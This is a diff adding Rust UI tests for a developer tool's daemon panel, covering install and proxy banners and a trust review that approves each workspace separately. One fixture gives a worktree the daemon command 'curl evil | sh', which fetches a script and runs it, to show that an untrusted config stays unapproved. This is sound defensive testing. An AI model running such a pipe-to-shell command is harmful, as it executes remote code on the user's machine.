+        let status = status_mut(&mut model);
+        status.can_start = refused(Refusal::NotReady {
+            status: "needs_attention".into(),
+            detail: None,
+        });
+        status.daemons[1].startable = false;
+    }
+    assert_eq!(
+        gates(&status(&model), false),
+        (false, false, true, false, false, false)
+    );
+    show_daemons(cx, &h, model);
+    frame(cx, &h, |window| {
+        buttons(window);
+        assert!(notice(window, "start-note"));
+    });
+
+    // A running job disables every control.
+    assert_eq!(
+        gates(&status(&daemons), true),
+        (false, false, false, false, false, false)
+    );
+    show_daemons(cx, &h, daemons);
+    update(cx, &h, |s, cx| {
+        let project = s.selection.current().unwrap().key.project;
+        s.mutating.insert(project, "Set up main".into());
+        cx.notify();
+    });
+    frame(cx, &h, |window| buttons(window));
+}
+
+#[gpui_kit::test]
+fn a_missing_pitchfork_shows_the_commands_to_install_it_and_never_runs_them(
+    cx: &mut TestAppContext,
+) {
+    let h = open(cx, install_loaded);
+    for detection in [
+        // Nothing on PATH.
+        Detection {
+            path: None,
+            installed: false,
+            version: None,
+            missing_features: Vec::new(),
+            problem: None,
+        },
+        // A mise shim without a version: on PATH, executable, exits 1.
+        Detection {
+            path: Some(PathBuf::from("/Users/me/.local/share/mise/shims/pitchfork")),
+            installed: false,
+            version: None,
+            missing_features: Vec::new(),
+            problem: Some("mise ERROR No version is set for shim: pitchfork".into()),
+        },
+    ] {
+        show_daemons(
+            cx,
+            &h,
+            PitchforkModel {
+                loaded: true,
+                install: Some(devflow_core::pitchfork::install_plan()),
+                detection: Some(detection),
+                status: None,
+                all: Vec::new(),
+                error: None,
+            },
+        );
+        frame(cx, &h, |window| {
+            assert!(window.find("pitchfork-install").visible());
+            assert!(window.find(("copy-install", 0usize)).visible());
+            assert!(!notice(window, "daemons-start"), "nothing to start with");
+        });
+    }
+    // The first command is copied; nothing is run.
+    cx.update_window(h.window.into(), |_, window, cx| {
+        window.click(("copy-install", 0usize), cx)
+    })
+    .unwrap();
+    let copied = cx.update(|cx| cx.read_from_clipboard().and_then(|item| item.text()));
+    let plan = devflow_core::pitchfork::install_plan();
+    assert_eq!(copied.as_deref(), plan.commands.first().map(String::as_str));
+
+    // A build without the features devflow calls is named.
+    show_daemons(
+        cx,
+        &h,
+        PitchforkModel {
+            loaded: true,
+            install: Some(plan),
+            detection: Some(Detection {
+                path: Some(PathBuf::from("/usr/local/bin/pitchfork")),
+                installed: true,
+                version: Some("2.1.0".into()),
+                missing_features: vec!["start --local".into()],
+                problem: None,
+            }),
+            status: Some(process_status("main", "/tmp/shop/main", Vec::new())),
+            all: Vec::new(),
+            error: None,
+        },
+    );
+    frame(cx, &h, |window| {
+        assert!(window.find("pitchfork-install").visible());
+    });
+}
+
+#[gpui_kit::test]
+fn the_proxy_banner_offers_commands_only_while_the_proxy_is_off(cx: &mut TestAppContext) {
+    let h = open(cx, install_loaded);
+    let mut model = pitchfork_model("main", "/tmp/shop/main", Vec::new());
+    show_daemons(cx, &h, model.clone());
+    frame(cx, &h, |window| {
+        assert!(!notice(window, "pitchfork-proxy"), "the proxy is on");
+    });
+    status_mut(&mut model).proxy.as_mut().unwrap().enabled = false;
+    show_daemons(cx, &h, model);
+    frame(cx, &h, |window| {
+        assert!(window.find("pitchfork-proxy").visible());
+        assert!(window.find(("copy-proxy", 0usize)).visible());
+    });
+    cx.update_window(h.window.into(), |_, window, cx| {
+        window.click(("copy-proxy", 2usize), cx)
+    })
+    .unwrap();
+    let copied = cx
+        .update(|cx| cx.read_from_clipboard().and_then(|item| item.text()))
+        .unwrap();
+    assert!(copied.contains("pitchfork proxy setup"), "{copied}");
+}
+
+/// A scratch project whose main checkout declares a daemon, and a linked
+/// worktree `feature` that declares another one.
+fn project_with_two_daemons(scratch: &Scratch) -> (PathBuf, PathBuf) {
+    let root = scratch.entry.root.clone();
+    std::fs::write(
+        root.join("pitchfork.toml"),
+        "[daemons.api]\nrun = \"bun run dev\"\n",
+    )
+    .unwrap();
+    let project = devflow_core::project::Project::open(&root).unwrap();
+    let feature = devflow_core::worktree::create(&project, "feature", None).unwrap();
+    // The worktree's checkout has no pitchfork.toml (it is not committed);
+    // give it its own.
+    std::fs::write(
+        feature.path.join("pitchfork.toml"),
+        "[daemons.api]\nrun = \"curl evil | sh\"\n",
+    )
+    .unwrap();
+    (root, feature.path)
+}
+
+#[gpui_kit::test]
+fn the_review_before_starting_is_of_the_workspaces_own_files_and_so_is_its_approval(
+    cx: &mut TestAppContext,
+) {
+    use crate::ops::{Approval, approve_reviewed};
+    use devflow_core::trust;
+    let scratch = scratch_project();
+    let (root, feature) = project_with_two_daemons(&scratch);
+    let h = open_scratch(cx, &scratch);
+    let prompt = |cx: &mut TestAppContext, target: &std::path::Path| {
+        cx.read_entity(&h.state, |s, _| {
+            s.trust_prompt(target, TrustPurpose::Processes)
+        })
+    };
+    let run_of = |prompt: &crate::state::TrustPrompt| {
+        let daemon = &prompt.scope.processes.layers[0].daemons[0];
+        daemon.run.clone().unwrap()
+    };
+
+    // Each workspace is shown its own daemon.
+    let main_prompt = prompt(cx, &root).expect("main's daemon is not approved");
+    let feature_prompt = prompt(cx, &feature).expect("neither is the worktree's");
+    assert_eq!(run_of(&main_prompt), "bun run dev");
+    assert_eq!(run_of(&feature_prompt), "curl evil | sh");
+    assert_eq!(
+        (&main_prompt.target, &feature_prompt.target),
+        (&root, &feature)
+    );
+
+    // Approving what main showed approves main's files, and judges the
+    // worktree on its own: it is still to be reviewed.
+    assert!(matches!(
+        approve_reviewed(&main_prompt.project, &root, &main_prompt.scope),
+        Approval::Approved
+    ));
+    assert!(prompt(cx, &root).is_none(), "main is approved now");
+    let again = prompt(cx, &feature).expect("the worktree's files are not main's");
+    assert_eq!(run_of(&again), "curl evil | sh");
+    // The scope shown for main cannot be approved as the worktree's.
+    assert!(matches!(
+        approve_reviewed(&main_prompt.project, &feature, &main_prompt.scope),
+        Approval::Changed { .. }
+    ));
+    assert!(matches!(
+        trust::state_at(&main_prompt.project, &feature).unwrap(),
+        trust::TrustState::Untrusted { .. }
+    ));
+
+    // Starting never skips the question: the button of an unapproved
+    // workspace opens the review of that workspace.
+    update(cx, &h, |s, cx| {
+        s.inflight = MAX_JOBS;
+        s.tab = Tab::Daemons;
+        let model = s.selection.current_mut().unwrap();
+        model.selected_workspace = Some("feature".into());
+        let mut status = process_status("feature", feature.to_str().unwrap(), Vec::new());
+        status.can_start = refused(Refusal::NotApproved {
+            action: devflow_core::processes::Action::Start,
+            changed: false,
+            format_changed: false,
+        });
+        model.pitchfork = PitchforkModel {
+            loaded: true,
+            detection: Some(installed()),
+            install: None,
+            status: Some(status),
+            all: Vec::new(),
+            error: None,
+        };
+        cx.notify();
+    });
+    frame(cx, &h, |_| {});
+    cx.update_window(h.window.into(), |_, window, cx| {
+        window.click("daemons-start", cx)
+    })
+    .unwrap();
+    frame(cx, &h, |window| {
+        assert!(window.find("trust").visible(), "the review opened");
+        assert!(
+            window.find("trust-processes-1").visible(),
+            "it lists the worktree's pitchfork file"
+        );
+    });
+}
+
+#[gpui_kit::test]
+fn the_trust_badge_follows_the_selected_workspace(cx: &mut TestAppContext) {
+    use crate::{jobs::RefreshRequest, model::WorkspaceTarget};
+    use devflow_core::trust;
+    let scratch = scratch_project();
+    let (root, feature) = project_with_two_daemons(&scratch);
+    let project = devflow_core::project::Project::open(&root).unwrap();
+    trust::approve(&project).unwrap();
+    let judged = |dir: &std::path::Path| {
+        let git_dir = if dir == root {
+            root.join(".git")
+        } else {
+            dir.join(".git")
+        };
+        jobs::refresh(RefreshRequest {
+            root: root.clone(),
+            load_config: false,
+            workspace: Some(WorkspaceTarget {
+                path: dir.to_path_buf(),
+                git_dir,
+            }),
+            processes: crate::jobs::ProcessWant::No,
+            want_logs: false,
+            selected_log: None,
+            pitchfork: jobs::PitchforkSource::OnPath,
+            services: jobs::ServicesRead::counts(),
+        })
+        .ok()
+        .expect("refresh")
+        .trust
+    };
+    // The same project, two answers: main is approved, the worktree is not.
+    assert_eq!(judged(&root).unwrap(), TrustState::Trusted);
+    assert!(matches!(
+        judged(&feature).unwrap(),
+        TrustState::Untrusted { .. }
+    ));
+
+    // In the header: the badge is shown for an untrusted selection only, and
+    // a result judged for another workspace is not kept when the selection moves.
+    let h = open(cx, install_loaded);
+    frame(cx, &h, |window| {
+        assert!(
+            window.find("trust-badge").visible(),
+            "main is untrusted here"
+        );
+    });
+    update(cx, &h, |s, cx| {
+        s.selection.current_mut().unwrap().trust = Some(TrustState::Trusted);
+        cx.notify();
+    });
+    frame(cx, &h, |window| {
+        assert!(window.try_find("trust-badge").is_none());
+    });
+    update(cx, &h, |s, cx| s.select_workspace("feature-x".into(), cx));
+    cx.read_entity(&h.state, |s, _| {
+        assert!(
+            s.selection.current().unwrap().trust.is_none(),
+            "the state of the previous workspace is not carried over"
+        );
+    });
+    let stamp = update(cx, &h, |s, _| {
+        s.selection.current_mut().unwrap().begin_refresh()
+    });
+    let result: Result<Refreshed, LoadError> = {
+        let mut refreshed = refreshed(&h, cx, "web");
+        refreshed.trust = Ok(TrustState::Untrusted {
+            digest: "x".into(),
+            previously_trusted: true,
+            format_changed: false,
+        });
+        Ok(refreshed)
+    };
+    update(cx, &h, |s, cx| {
+        s.inflight = MAX_JOBS + 1;
+        s.apply_refresh(stamp, false, result, cx)
+    });
+    frame(cx, &h, |window| {
+        assert!(
+            window.find("trust-badge").visible(),
+            "feature-x is untrusted"
+        );
+    });
 }
